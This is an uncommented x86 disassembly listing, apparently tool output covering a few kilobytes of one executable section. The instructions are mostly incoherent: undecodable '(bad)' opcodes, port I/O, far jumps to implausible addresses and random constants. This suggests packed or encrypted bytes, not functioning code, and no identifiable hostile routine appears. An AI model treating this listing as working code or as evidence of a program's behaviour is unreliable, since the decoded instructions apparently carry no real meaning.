  4082e3:	add    DWORD PTR [edx-0xc],ebp
  4082e6:	repnz dec ecx
  4082e8:	int    0xa9
  4082ea:	xchg   esi,eax
  4082eb:	jnp    0x40834b
  4082ed:	jb     0x40831a
  4082ef:	cmp    al,0xee
  4082f1:	gs (bad) 
  4082f4:	mov    ch,0x53
  4082f6:	or     al,bh
  4082f8:	pushf  
  4082f9:	and    BYTE PTR [ecx+edx*2+0x7],ah
  4082fd:	sbb    BYTE PTR ds:0x95a6ef49,dh
  408303:	jae    0x40832f
  408305:	jle    0x40830e
  408307:	mov    ch,0xf0
  408309:	add    BYTE PTR [edi],bl
  40830b:	loopne 0x40837f
  40830d:	or     ch,BYTE PTR ds:[eax-0x43]
  408311:	push   ss
  408312:	dec    edi
  408313:	in     al,0x1
  408315:	pop    ebp
  408316:	test   BYTE PTR [edx-0x68d5ed02],dl
  40831c:	inc    ebp
  40831d:	mov    eax,0xdec3a1e6
  408322:	out    dx,al
  408323:	ret    0xc05c
  408326:	mov    al,0x7
  408328:	mov    edi,0xd1648bed
  40832d:	inc    ebp
  40832e:	(bad)  
  40832f:	out    dx,eax
  408330:	jbe    0x4082b9
  408332:	dec    esi
  408333:	dec    edx
  408334:	xchg   ecx,eax
  408336:	adc    eax,0x8ef5af66
  40833b:	pop    ebp
  40833c:	dec    ebp
  40833d:	mov    ah,0x46
  40833f:	cs cld 
  408341:	xor    al,0xe2
  408343:	call   0xf1351e4b
  408348:	mov    eax,ds:0x550f69c
  40834d:	mov    edi,0x9633bd9d
  408352:	arpl   WORD PTR [esi],sp
  408354:	or     eax,0xcbce4287
  408359:	in     eax,dx
  40835a:	or     DWORD PTR [esi+esi*4+0x49],0xffffff83
  40835f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408360:	inc    edi
  408361:	xchg   edi,eax
  408362:	in     al,dx
  408363:	push   ebp
  408364:	inc    esi
  408365:	outs   dx,DWORD PTR ds:[esi]
  408366:	pop    edi
  408367:	and    al,0x18
  408369:	clc    
  40836a:	les    ebx,FWORD PTR [eax-0x21]
  40836d:	pop    ds
  40836e:	shl    BYTE PTR [edi-0x21bdd4d3],1
  408374:	je     0x40832f
  408376:	popf   
  408377:	sub    BYTE PTR [edi+0x35],0x1e
  40837b:	or     bh,dl
  40837d:	sbb    BYTE PTR [ebx+0x10],bl
  408380:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408381:	dec    ebx
  408382:	push   ebp
  408383:	xchg   ebx,eax
  408384:	and    al,dl
  408386:	icebp  
  408387:	xchg   esi,eax
  408388:	addr16 (bad) 
  40838a:	in     al,dx
  40838b:	and    DWORD PTR [edx+0x4964036f],0x59
  408392:	stos   BYTE PTR es:[edi],al
  408393:	mov    esi,0xdc79298e
  408398:	repnz daa 
  40839a:	sbb    BYTE PTR [esi-0x2e],dh
  40839d:	loopne 0x40833d
  40839f:	jae    0x408339
  4083a1:	xchg   esp,eax
  4083a2:	inc    eax
  4083a3:	bnd call 0xef2ecc5b
  4083a9:	dec    edx
  4083aa:	pop    ds
  4083ab:	adc    BYTE PTR [edx+0x3e51fcc5],0xf6
  4083b2:	pop    es
  4083b3:	inc    edi
  4083b4:	xchg   cl,dl
  4083b6:	loopne 0x4083ae
  4083b8:	mov    DWORD PTR [eax],ebx
  4083ba:	sar    al,cl
  4083bc:	cmp    ch,BYTE PTR [ebp-0x34]
  4083bf:	lods   al,BYTE PTR ds:[esi]
  4083c0:	lahf   
  4083c1:	inc    ebx
  4083c2:	xchg   esi,eax
  4083c4:	jge    0x40841b
  4083c6:	adc    esi,DWORD PTR [eax]
  4083c8:	add    ch,cl
  4083ca:	nop
  4083cb:	stos   DWORD PTR es:[edi],eax
  4083cc:	xor    al,0x7b
  4083ce:	in     al,dx
  4083cf:	or     cl,BYTE PTR [eax+0x91bbd55]
  4083d5:	jo     0x4083eb
  4083d7:	aas    
  4083d8:	ret    0xfe26
  4083db:	fcomip st,st(1)
  4083dd:	push   cs
  4083de:	xlat   BYTE PTR ds:[ebx]
  4083df:	and    ecx,edi
  4083e1:	mov    ah,0x77
  4083e3:	inc    ebx
  4083e4:	xlat   BYTE PTR ds:[ebx]
  4083e5:	sbb    al,0x43
  4083e7:	leave  
  4083e8:	jmp    0x4083da
  4083ea:	jne    0x4083db
  4083ec:	enter  0x8eb8,0x50
  4083f0:	fidivr DWORD PTR [ecx+0x5d06319]
  4083f6:	pop    ds
  4083f7:	jmp    0xcf4d6e3
  4083fc:	xchg   DWORD PTR [ebp+0x7494f95a],edi
  408402:	enter  0xc05c,0x6c
  408406:	push   ebp
  408407:	pop    esi
  408408:	jbe    0x40845c
  40840a:	pop    esp
  40840b:	mov    eax,0x52f843f7
  408410:	xchg   DWORD PTR [edi+0x456fe84d],ebp
  408416:	aas    
  408417:	fisttp QWORD PTR ds:0xc7efcb8f
  40841d:	or     esp,DWORD PTR [edi+0x2997f18e]
  408423:	xor    eax,0xd48f0a98
  408428:	lods   al,BYTE PTR ds:[esi]
  408429:	(bad)  
  40842a:	adc    al,dl
  40842c:	fs inc ecx
  40842e:	push   0xffffffec
  408430:	sub    eax,0x77f8ce27
  408435:	inc    edx
  408436:	sbb    cl,ah
  408438:	xor    BYTE PTR [ecx],ah
  40843a:	pop    edx
  40843b:	cmp    eax,0x650022d1
  408440:	mov    dl,0x6d
  408442:	bound  esi,QWORD PTR [esi+esi*1]
  408445:	(bad)  [ecx-0xeef187e]
  40844b:	inc    esi
  40844c:	(bad)  
  40844d:	fcom   QWORD PTR [esp+esi*2+0x1bf2843b]
  408454:	ins    DWORD PTR es:[edi],dx
  408455:	push   es
  408456:	mov    ds:0x3be2011,eax
  40845b:	mov    eax,ds:0x2f912a8d
  408460:	dec    edi
  408461:	test   edx,eax
  408463:	pxor   mm3,QWORD PTR [esi+ebp*4+0x58]
  408468:	test   cl,0xc5
  40846b:	stos   BYTE PTR es:[edi],al
  40846c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40846d:	pop    esi
  40846e:	push   ebp
  40846f:	or     esi,DWORD PTR [ebp+0x6e]
  408472:	repnz adc al,BYTE PTR [esi+0x656f9f64]
  408479:	adc    dh,BYTE PTR [edi+0x7f]
  40847c:	enter  0xbb4d,0xe
  408480:	in     eax,dx
  408481:	test   al,0x78
  408483:	pop    es
  408484:	je     0x408505
  408486:	jl     0x4084ae
  408488:	shr    BYTE PTR [ebx+ecx*8-0x3b],1
  40848c:	cli    
  40848d:	(bad)  
  40848e:	es mov bl,0x8c
  408491:	cmp    esi,DWORD PTR [ecx-0x595fcdb0]
  408497:	mov    eax,ds:0x68911108
  40849c:	or     BYTE PTR [ebp-0x12a576ae],dl
  4084a2:	aas    
  4084a3:	dec    ebp
  4084a4:	dec    ebp
  4084a5:	xchg   esp,eax
  4084a6:	push   edx
  4084a7:	ffreep st(3)
  4084a9:	push   0x60d331a
  4084ae:	retf   
  4084af:	aam    0x3a
  4084b1:	adc    DWORD PTR [edi+eiz*4],ebx
  4084b4:	ret    
  4084b5:	jmp    0x4cc7:0xcebfb5fe
  4084bc:	dec    edi
  4084bd:	pop    eax
  4084be:	mov    esi,?
  4084c0:	xchg   edx,eax
  4084c1:	rol    BYTE PTR [edx+eax*8+0x3ec61a0e],cl
  4084c8:	mov    al,ds:0xb50e602
  4084cd:	mov    ch,0xa8
  4084cf:	push   ss
  4084d0:	xchg   esi,eax
  4084d1:	and    BYTE PTR [edx+0x5124cf5a],ah
  4084d7:	scas   eax,DWORD PTR es:[edi]
  4084d8:	pop    ebx
  4084d9:	dec    ecx
  4084da:	js     0x408492
  4084dc:	fld    QWORD PTR ds:0x15db659e
  4084e2:	xchg   ebp,eax
  4084e3:	ss ja  0x4084e3
  4084e6:	jb     0x4084fa
  4084e8:	mov    esp,0x7cb3c86f
  4084ed:	retf   
  4084ee:	ret    0xa1e4
  4084f1:	inc    edx
  4084f2:	mov    bl,0x62
  4084f4:	dec    eax
  4084f5:	add    al,0x41
  4084f7:	fcom   DWORD PTR [edi+eiz*8-0x7f22448e]
  4084fe:	and    BYTE PTR [eax+ebp*2],al
  408501:	and    al,0x17
  408503:	repz sbb BYTE PTR [edi+ebx*1+0x6001f9d],cl
  40850b:	sbb    eax,DWORD PTR [ebp-0x48]
  40850e:	and    dh,BYTE PTR [ebx]
  408510:	push   ss
  408511:	mov    ds:0x884eaf18,al
  408516:	cmp    esi,DWORD PTR ds:0xd9f1017a
  40851c:	not    DWORD PTR [ebx+0x4d9b10ad]
  408522:	jmp    0x2735e637
  408527:	mov    esi,0x90732430
  40852c:	call   0x40ce:0xcfea726
  408533:	imul   ebx,ecx,0x57
  408536:	pop    ds
  408537:	addr16 push ebp
  408539:	mov    bh,0xf0
  40853b:	rol    DWORD PTR [esi+0x51],0xf5
  40853f:	cwde   
  408540:	pop    esp
  408541:	mov    bl,0xdb
  408543:	repz je 0x408541
  408546:	shl    BYTE PTR [esp+ebx*8],cl
  408549:	push   edi
  40854a:	xchg   edx,eax
  40854b:	(bad)  
  40854c:	mov    ds:0xcd364a5f,al
  408551:	xor    cl,bl
  408553:	push   ds
  408554:	aas    
  408555:	jne    0x4085ce
  408557:	in     al,dx
  408558:	(bad)  
  408559:	imul   BYTE PTR [edi+0x7e82966d]
  40855f:	jae    0x408578
  408561:	sub    BYTE PTR [ebx+ebp*8],cl
  408564:	pop    es
  408565:	iret   
  408566:	jnp    0x408517
  408568:	jo     0x408582
  40856a:	sub    al,0x1a
  40856c:	js     0x4085c6
  40856e:	jno    0x4085e4
  408570:	sar    BYTE PTR [ebp-0x35],0xd0
  408574:	shl    DWORD PTR [edi+eax*4+0x61],cl
  408578:	imul   edi,DWORD PTR [esi-0x6b],0x15
  40857c:	xchg   esp,eax
  40857d:	enter  0xc757,0xce
  408581:	and    al,0xcb
  408584:	pop    ds
  408585:	mov    esp,0x4c706bc7
  40858a:	mov    ebp,0xd709e8b5
  40858f:	dec    edi
  408590:	mov    ds:0x515bf838,eax
  408595:	(bad)  
  408596:	repz out 0xc7,eax
  408599:	xchg   BYTE PTR [ecx],bh
  40859b:	jmp    0xd7c2:0x1c001581
  4085a2:	daa    
  4085a3:	mov    DWORD PTR [eax-0x6837553b],ebx
  4085a9:	xor    eax,0x6444a64b
  4085ae:	pop    ebx
  4085af:	loop   0x40858b
  4085b1:	inc    ebp
  4085b2:	clc    
  4085b3:	adc    BYTE PTR [ebp+ecx*1-0x3af2b6d4],dh
  4085ba:	sub    ch,BYTE PTR [ebx]
  4085bc:	adc    al,0x3a
  4085be:	adc    ebp,DWORD PTR [eax]
  4085c0:	rol    DWORD PTR [edi-0xb],0xd
  4085c4:	scas   eax,DWORD PTR es:[edi]
  4085c5:	in     al,dx
  4085c6:	adc    bh,BYTE PTR [ecx+0x319fed6f]
  4085cc:	jp     0x4085f2
  4085ce:	and    eax,0x7b732549
  4085d3:	xlat   BYTE PTR ds:[ebx]
  4085d4:	(bad)  
  4085d5:	addr16 popa 
  4085d7:	or     esi,esp
  4085d9:	dec    ebx
  4085da:	sub    edx,edi
  4085dc:	xor    ecx,DWORD PTR [ebx-0x5965ba88]
  4085e2:	mov    ebp,0xc4172d70
  4085e7:	ficom  WORD PTR gs:[eax+edx*1]
  4085eb:	in     al,0x47
  4085ed:	pop    ss
  4085ee:	xchg   ecx,eax
  4085ef:	sbb    cl,BYTE PTR [eax-0x69]
  4085f2:	push   ss
  4085f3:	add    esi,eax
  4085f5:	fldenv [ecx]
  4085f7:	push   esi
  4085f8:	ret    0xd72a
  4085fb:	fidivr DWORD PTR [ecx-0x5b116ce6]
  408601:	pusha  
  408602:	or     al,0x2c
  408604:	mov    es,ebp
  408606:	ror    BYTE PTR [edi+0x9],0x9b
  40860a:	cmp    ebp,ebp
  40860c:	xor    dl,ch
  40860e:	fsub   QWORD PTR [ecx]
  408610:	push   0xffffffaf
  408612:	push   ecx
  408613:	call   0xb8d1617d
  408618:	dec    BYTE PTR ds:0x227e1fc8
  40861e:	pop    ds
  40861f:	mov    ebx,0xcecc8c8f
  408624:	leave  
  408625:	cwde   
  408626:	hlt    
  408627:	sub    esi,DWORD PTR [ebp+eiz*2-0xa7480ae]
  40862e:	inc    edi
  40862f:	push   ebp
  408630:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408631:	xor    bl,cl
  408633:	inc    edx
  408634:	aad    0x8
  408636:	retf   0xe18c
  408639:	ja     0x408663
  40863b:	cmp    BYTE PTR [ecx+ecx*8-0x19],ch
  40863f:	adc    esp,edi
  408641:	mov    eax,0x39d0f3f
  408646:	jns    0x408681
  408648:	ins    DWORD PTR es:[edi],dx
  408649:	imul   edx,DWORD PTR [edi],0xfffffff8
  40864c:	jmp    0xf627:0x5d48d10d
  408653:	fistp  DWORD PTR [ebx+0x30]
  408656:	popa   
  408657:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408658:	test   DWORD PTR [esp+esi*2],eax
  40865b:	mov    esi,0xef742e37
  408660:	sub    eax,DWORD PTR [edi]
  408662:	in     eax,dx
  408663:	add    al,0x4d
  408665:	popa   
  408666:	aad    0x8
  408668:	ret    
  408669:	xchg   BYTE PTR [ebp+0x5a7146a],ah
  40866f:	fsub   DWORD PTR [esp+ebx*4+0x41]
  408673:	sbb    BYTE PTR [esi-0x5ac6c01e],0xcb
  40867a:	addr16 push ecx
  40867c:	addr16 pop ebx
  40867e:	xchg   DWORD PTR [esi+eax*8],ebx
  408681:	pop    esp
  408682:	push   ds
  408683:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408684:	adc    eax,0xf68eca42
  408689:	nop
  40868a:	ins    DWORD PTR es:[edi],dx
  40868b:	fmul   QWORD PTR [edi+0x52e8507b]
  408691:	shl    DWORD PTR [ebx-0x64],0x21
  408695:	pusha  
  408696:	pop    ebx
  408697:	mul    DWORD PTR [ebp-0x80]
  40869a:	in     eax,0x1b
  40869c:	xlat   BYTE PTR ds:[ebx]
  40869d:	mov    BYTE PTR [ebx],cl
  40869f:	test   eax,0xd1b53f2d
  4086a4:	sub    edi,DWORD PTR [edi-0x6558138]
  4086aa:	sub    al,cl
  4086ac:	xlat   BYTE PTR ds:[ebx]
  4086ad:	xlat   BYTE PTR ds:[ebx]
  4086ae:	cmp    al,0x57
  4086b0:	mov    ecx,0xbd69e9c
  4086b5:	jg     0x408659
  4086b7:	(bad)  
  4086b8:	cmp    esi,DWORD PTR ds:0x74f20466
  4086be:	and    edi,DWORD PTR [ecx-0x4c]
  4086c1:	mov    al,0x76
  4086c3:	pop    ss
  4086c4:	cmc    
  4086c5:	fbld   TBYTE PTR [ebx]
  4086c7:	jne    0x408705
  4086c9:	out    dx,al
  4086ca:	retf   0xbd9b
  4086cd:	mov    ecx,0x725dcd7b
  4086d2:	push   0xea12cdf8
  4086d7:	adc    DWORD PTR [ebp-0x2e940544],ecx
  4086dd:	stc    
  4086de:	pusha  
  4086df:	lea    edx,[esi+esi*2-0x64]
  4086e3:	stc    
  4086e4:	aad    0xab
  4086e6:	dec    ebp
  4086e7:	or     eax,0x78bff3cb
  4086ec:	mov    edi,0x3660a017
  4086f1:	sbb    dl,BYTE PTR ds:0x6c285348
  4086f7:	jp     0x40873e
  4086f9:	mov    dh,0x13
  4086fb:	pop    ds
  4086fc:	push   ebp
  4086fd:	push   cs
  4086fe:	cmp    eax,0x1dc46306
  408703:	xor    DWORD PTR [ebx],esi
  408705:	stos   BYTE PTR es:[edi],al
  408706:	jnp    0x40875c
  408708:	inc    esp
  408709:	adc    BYTE PTR [ebp-0x77],dl
  40870c:	jmp    0x8fa74761
  408711:	mov    esi,0x99f7fc2e
  408716:	cmp    ah,BYTE PTR [edi+0x255c0bff]
  40871c:	xor    al,0x74
  40871e:	imul   edx
  408720:	xchg   ecx,eax
  408721:	pop    es
  408722:	and    al,0x24
  408724:	push   eax
  408725:	fwait
  408726:	out    0xaf,eax
  408728:	mov    ds:0xcca5be2d,al
  40872d:	ja     0x40875c
  40872f:	push   ebp
  408730:	jl     0x408785
  408732:	push   ss
  408733:	rcr    esp,cl
  408735:	repz cmp eax,0x5ce4473a
  40873b:	stc    
  40873c:	mov    esp,0x1e4685cb
  408741:	mov    ch,0xee
  408743:	push   es
  408744:	xchg   esp,eax
  408745:	and    edi,DWORD PTR [eax-0x30]
  408748:	sti    
  408749:	jns    0x4087b3
  40874b:	ins    BYTE PTR es:[edi],dx
  40874c:	pop    ebp
  40874d:	or     eax,0xd76aef11
  408752:	push   ebx
  408754:	dec    ecx
  408755:	push   DWORD PTR [edx+0x17]
  408758:	pop    ebx
  408759:	xor    al,0x66
  40875b:	mov    al,ds:0xb37dc549
  408760:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408761:	add    al,0xd4
  408763:	jb     0x408713
  408765:	cld    
  408766:	sub    WORD PTR [edx],0xceae
  40876b:	mov    ch,0xc4
  40876d:	sub    DWORD PTR [ebx+0x456141bc],esi
  408773:	rol    DWORD PTR ds:0x26688f9f,1
  408779:	dec    esi
  40877a:	in     al,0x3d
  40877c:	pop    ecx
  40877d:	repz and eax,0x933d090b
  408783:	sbb    DWORD PTR [edx],0x8ac6c80
  408789:	jl     0x4087fc
  40878b:	mov    ecx,0xad8aabbb
  408790:	out    0xc0,al
  408792:	clc    
  408793:	(bad)  
  408794:	cmp    al,0x88
  408796:	push   ss
  408797:	xor    al,0x63
  408799:	sub    DWORD PTR [edx],eax
  40879b:	jecxz  0x40876a
  40879d:	test   eax,0xaccfb356
  4087a2:	mov    edi,0xe2ef1e9d
  4087a7:	shl    DWORD PTR [esi-0x50],1
  4087aa:	aad    0x4e
  4087ac:	pop    ebp
  4087ad:	enter  0x8d19,0xd4
  4087b1:	mov    edi,ebx
  4087b3:	rol    DWORD PTR [eax+0x1f],1
  4087b6:	in     eax,dx
  4087b7:	mov    ecx,0xe7db82a
  4087bc:	lds    ecx,FWORD PTR [eax-0x24]
  4087bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087c0:	ret    
  4087c1:	outs   dx,BYTE PTR ds:[esi]
  4087c2:	pop    esi
  4087c3:	and    eax,0x5d3961f6
  4087c8:	pop    esp
  4087c9:	xchg   BYTE PTR [edx],bl
  4087cb:	adc    ah,BYTE PTR [ebx+0x5a]
  4087ce:	sbb    bh,BYTE PTR [ecx+0x70]
  4087d1:	sub    BYTE PTR [ebx-0x71],0x43
  4087d5:	mov    ds:0x7af0a808,al
  4087da:	add    bl,ah
  4087dc:	es xchg edi,eax
  4087de:	sbb    ebx,DWORD PTR [ebp+0x5fb18e2b]
  4087e4:	jecxz  0x40878d
  4087e6:	mov    bl,0x24
  4087e8:	fisubr DWORD PTR [ebp+0x58]
  4087eb:	in     al,0x5d
  4087ed:	and    al,0x24
  4087ef:	cmp    eax,0x114162be
  4087f4:	adc    eax,0x4b2ac829
  4087f9:	sbb    ah,BYTE PTR [ebp-0x4429fcf1]
  4087ff:	lea    edi,[eax]
  408801:	xor    eax,0xbc30a136
  408806:	mov    WORD PTR [edx+0x47],ds
  408809:	je     0x4087ca
  40880b:	nop
  40880c:	pop    esp
  40880d:	mov    edi,0x62eed7e6
  408812:	push   esi
  408813:	and    BYTE PTR [esi+eiz*2+0x4d],cl
  408817:	test   eax,0x8091e613
  40881c:	adc    al,0x81
  40881e:	xor    esp,ecx
  408820:	data16 je 0x4087cd
  408823:	pop    ebp
  408824:	mov    esi,0x2e076d2e
  408829:	(bad)  [edi+0x7a0693b4]
  40882f:	je     0x40882f
  408831:	push   eax
  408832:	fsubp  st(2),st
  408834:	fnsave [edi+0x49ee5a29]
  40883a:	stos   BYTE PTR es:[edi],al
  40883b:	mov    eax,ds:0xe542d11b
  408840:	jne    0x4087cd
  408842:	or     DWORD PTR [edx+edx*1],ebp
  408845:	adc    ebp,ecx
  408847:	mov    esi,0x2f901b04
  40884c:	(bad)  
  40884d:	sub    al,0x18
  40884f:	or     eax,0xa531a3cf
  408854:	adc    eax,0xf67daced
  408859:	adc    BYTE PTR [ecx+edx*1-0x17],al
  40885d:	add    dl,BYTE PTR [edi-0x1ab21e5]
  408863:	call   0x552c316
  408868:	aad    0xf5
  40886a:	icebp  
  40886b:	pop    ebp
  40886c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40886d:	and    ebx,esi
  40886f:	pop    ebx
  408870:	dec    edi
  408871:	dec    edx
  408872:	je     0x4088b1
  408874:	cld    
  408875:	mov    ah,0xa4
  408877:	clc    
  408878:	jnp    0x40883b
  40887a:	cmp    edi,edi
  40887c:	pushf  
  40887d:	test   DWORD PTR [ebp+0x76266307],ebx
  408883:	fs push esi
  408885:	xchg   ebx,eax
  408886:	push   es
  408887:	mov    DWORD PTR [esi+0x57],edi
  40888a:	and    edx,DWORD PTR [edi+ecx*4+0x51]
  40888e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40888f:	adc    al,0x91
  408891:	inc    eax
  408892:	adc    dh,BYTE PTR [eax+0x6a]
  408895:	test   BYTE PTR [edx],cl
  408897:	ins    BYTE PTR es:[edi],dx
  408898:	dec    ecx
  408899:	jb     0x40881f
  40889b:	sbb    ch,BYTE PTR [edi+0x3d4dc23d]
  4088a1:	es (bad) 
  4088a3:	inc    DWORD PTR [esi]
  4088a5:	and    al,0x26
  4088a7:	and    DWORD PTR [esi+ebp*4+0x19],esp
  4088ab:	jle    0x4088ec
  4088ad:	into   
  4088ae:	xor    eax,0xceccc099
  4088b3:	mov    ecx,0xf45a470c
  4088b8:	mov    ds:0xeab1a817,eax
  4088bd:	push   eax
  4088be:	inc    eax
  4088bf:	(bad)  
  4088c0:	lods   eax,DWORD PTR ds:[esi]
  4088c1:	mov    ah,0x6a
  4088c3:	add    al,dh
  4088c5:	or     DWORD PTR [ecx-0x3a],ecx
  4088c8:	dec    edx
  4088c9:	lock sub al,0x2a
  4088cc:	(bad)  
  4088cd:	data16 bnd jae 0x4088f5
  4088d1:	inc    ecx
  4088d2:	and    dl,BYTE PTR [ecx]
  4088d4:	js     0x4088f0
  4088d6:	int3   
  4088d7:	rcr    DWORD PTR [edx],1
  4088d9:	add    eax,0xabe52a73
  4088de:	in     al,0xb
  4088e0:	cmc    
  4088e1:	out    dx,eax
  4088e2:	sub    DWORD PTR [edi+eiz*2-0x21],eax
  4088e6:	adc    ebp,DWORD PTR [ebp-0x4fdfeab6]
  4088ec:	and    BYTE PTR [edi+0x7f],dh
  4088ef:	mov    ebx,0xc2d5923e
  4088f4:	outs   dx,BYTE PTR ds:[esi]
  4088f5:	cmp    cl,BYTE PTR [ecx-0x12]
  4088f8:	jl     0x40893c
  4088fa:	shl    dh,0xb8
  4088fd:	jae    0x40892a
  4088ff:	fcmovne st,st(3)
  408901:	out    0x2,eax
  408903:	outs   dx,BYTE PTR ds:[si]
  408905:	jp     0x40897f
  408907:	clc    
  408908:	test   DWORD PTR ds:0xc8f2f5cf,ebx
  40890e:	xor    dh,BYTE PTR [ecx]
  408910:	adc    esi,DWORD PTR [esi+0x29]
  408913:	cdq    
  408914:	adc    eax,0xf1922a7d
  408919:	ret    
  40891a:	mov    al,ds:0x6674cf6a
  40891f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408920:	dec    edx
  408921:	pop    es
  408922:	imul   edx,DWORD PTR [ebx],0x54ba418b
  408928:	or     eax,0x77d05d23
  40892d:	int    0x9a
  40892f:	mov    eax,0xf6ce83ef
  408934:	loopne 0x4089ab
  408936:	push   edx
  408937:	sbb    DWORD PTR [edx+0x6e],0x6e727e91
  40893e:	xchg   ebx,eax
  40893f:	fsubr  DWORD PTR [eax+0x5fdbf7fa]
  408945:	mov    al,0x5a
  408947:	push   ebx
  408948:	cs enter 0xcad6,0x72
  40894d:	leave  
  40894e:	jl     0x40894d
  408950:	inc    eax
  408951:	daa    
  408952:	sub    ebx,DWORD PTR [ecx]
  408954:	(bad)  
  408955:	sub    ebx,esp
  408957:	dec    ebp
  408958:	sti    
  408959:	out    dx,al
  40895a:	nop
  40895b:	push   0x6
  40895d:	pop    esp
  40895e:	addr16 in eax,dx
  408960:	and    cl,ch
  408962:	pop    ax
  408964:	or     dl,BYTE PTR gs:0x90572039
  40896b:	fcom   QWORD PTR [ecx+0x1e]
  40896e:	mov    dh,0xec
  408970:	stos   DWORD PTR es:[edi],eax
  408971:	inc    edi
  408972:	ds push ds
  408974:	add    al,0x10
  408976:	outs   dx,DWORD PTR ds:[esi]
  408977:	jmp    0xeea407f1
  40897c:	test   bh,al
  40897e:	(bad)  
  40897f:	in     eax,dx
  408980:	rcl    BYTE PTR [esi-0x7f9c18ee],cl
  408986:	push   0x62264dee
  40898b:	mov    edx,0x1333fa1
  408990:	fidivr WORD PTR cs:[esi+0x62a7fccb]
  408997:	mov    ecx,0x34a117ef
  40899c:	and    DWORD PTR [edx],ecx
  40899e:	out    dx,eax
  40899f:	xchg   esi,eax
  4089a0:	push   es
  4089a1:	aam    0xa0
  4089a3:	call   0x180f:0xd97ee793
  4089aa:	push   esp
  4089ab:	das    
  4089ac:	adc    bh,BYTE PTR [edx]
  4089ae:	in     eax,dx
  4089af:	and    esi,DWORD PTR ds:0x812e4e97
  4089b5:	adc    DWORD PTR [edi+0x729ab847],esi
  4089bb:	inc    esi
  4089bc:	data16 add al,0xac
  4089bf:	add    al,0x10
  4089c1:	mov    ebx,0xc0905c8a
  4089c6:	ins    DWORD PTR es:[edi],dx
  4089c7:	lock jbe 0x40899e
  4089ca:	pushf  
  4089cb:	ds jg  0x408a12
  4089ce:	dec    ebx
  4089cf:	jmp    0x59657329
  4089d4:	cmp    eax,0xf825b809
  4089d9:	jecxz  0x40899c
  4089db:	ja     0x408a4d
  4089dd:	mov    al,ds:0xaba96605
  4089e2:	pop    edi
  4089e3:	loopne 0x4089b5
  4089e5:	sbb    eax,0x7f5d7474
  4089ea:	out    0xa3,eax
  4089ec:	sub    BYTE PTR [ecx-0x55],0x4e
  4089f0:	enter  0xd7f1,0xb4
  4089f4:	imul   ebx,ebx,0xcb3ee4eb
  4089fa:	mov    edi,0xf9d14e3f
  4089ff:	add    cl,0x56
  408a02:	dec    edx
  408a03:	in     eax,0x6
  408a05:	(bad)  
  408a06:	jo     0x4089a7
  408a08:	sbb    DWORD PTR [edx],edx
  408a0a:	add    bh,BYTE PTR ds:0xacfb1bb7
  408a10:	int3   
  408a11:	leave  
  408a12:	shr    DWORD PTR [edx-0x70],0x59
  408a16:	ss jbe 0x408a2d
  408a19:	jbe    0x408a32
  408a1b:	jl     0x4089a9
  408a1d:	(bad)  
  408a1e:	fprem  
  408a20:	outs   dx,BYTE PTR ds:[esi]
  408a21:	push   cs
  408a22:	js     0x408a6e
  408a24:	in     eax,dx
  408a25:	and    bl,BYTE PTR [edx]
  408a27:	in     al,0x79
  408a29:	sar    BYTE PTR [edi],cl
  408a2b:	out    dx,al
  408a2c:	add    dh,dl
  408a2e:	sub    BYTE PTR [eax-0x7b0716a6],bh
  408a34:	adc    ebx,ebp
  408a36:	je     0x408a43
  408a38:	imul   edx,DWORD PTR [edi],0x60ab1700
  408a3e:	popf   
  408a3f:	loopne 0x408a92
  408a41:	add    al,0x8a
  408a43:	dec    esp
  408a44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a45:	call   DWORD PTR [ebx]
  408a47:	sub    eax,0x9abb58f4
  408a4c:	jmp    edx
  408a4e:	fld    QWORD PTR [ebp-0x4bfab5d8]
  408a54:	sub    DWORD PTR [esi+0x3c040338],esp
  408a5a:	mov    eax,0x71101f0b
  408a5f:	ss push esp
  408a61:	sbb    DWORD PTR [esi-0x55],0x57
  408a65:	dec    ebp
  408a66:	ret    
  408a67:	mov    eax,ds:0x6737b617
  408a6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a6d:	call   0x8f7c:0x3475db66
  408a74:	inc    edi
  408a75:	je     0x408a68
  408a77:	sbb    ah,BYTE PTR [esi+0x4a]
  408a7a:	icebp  
  408a7b:	mov    eax,0xcfc6bfab
  408a80:	rcl    DWORD PTR [ecx+0x7d],cl
  408a83:	iret   
  408a84:	ja     0x408a23
  408a86:	push   es
  408a87:	xchg   edi,eax
  408a88:	mov    ah,0x9f
  408a8a:	jo     0x408a19
  408a8c:	(bad)  
  408a8d:	std    
  408a8e:	adc    eax,0x3d4c9b24
  408a93:	shl    BYTE PTR [edi],1
  408a95:	add    edi,eax
  408a97:	mul    BYTE PTR gs:[eax]
  408a9a:	mov    ?,edx
  408a9c:	fist   DWORD PTR [edx]
  408a9e:	sbb    eax,0xc22ec209
  408aa3:	jmp    0x408a50
  408aa5:	jo     0x408afe
  408aa7:	imul   esi,DWORD PTR [edi],0x8d1997b
  408aad:	pop    edi
  408aae:	jae    0x408acb
  408ab0:	or     al,0x5c
  408ab2:	(bad)  
  408ab3:	or     ah,ah
  408ab5:	les    ecx,FWORD PTR [ebp-0x46b5290a]
  408abb:	mov    bh,0x96
  408abd:	in     eax,dx
  408abe:	dec    ebp
  408abf:	loop   0x408a4a
  408ac1:	xlat   BYTE PTR ds:[ebx]
  408ac2:	add    edi,esp
  408ac4:	int3   
  408ac5:	mov    eax,0xdc429073
  408aca:	je     0x408b0d
  408acc:	add    al,0x72
  408ace:	inc    ebp
  408acf:	sub    DWORD PTR [ebx-0x2d],esp
  408ad2:	dec    esi
  408ad3:	push   esi
  408ad4:	adc    ebx,0x61
  408ad7:	rol    ebx,0x33
  408ada:	cld    
  408adb:	fcom   QWORD PTR [edi+0x5ebd76bb]
  408ae1:	fcmovne st,st(1)
  408ae3:	mov    al,ds:0xd75cd56a
  408ae8:	popa   
  408ae9:	dec    ebx
  408aea:	xchg   eax,esp
  408aec:	fld    DWORD PTR [ebp+0x6c830b5e]
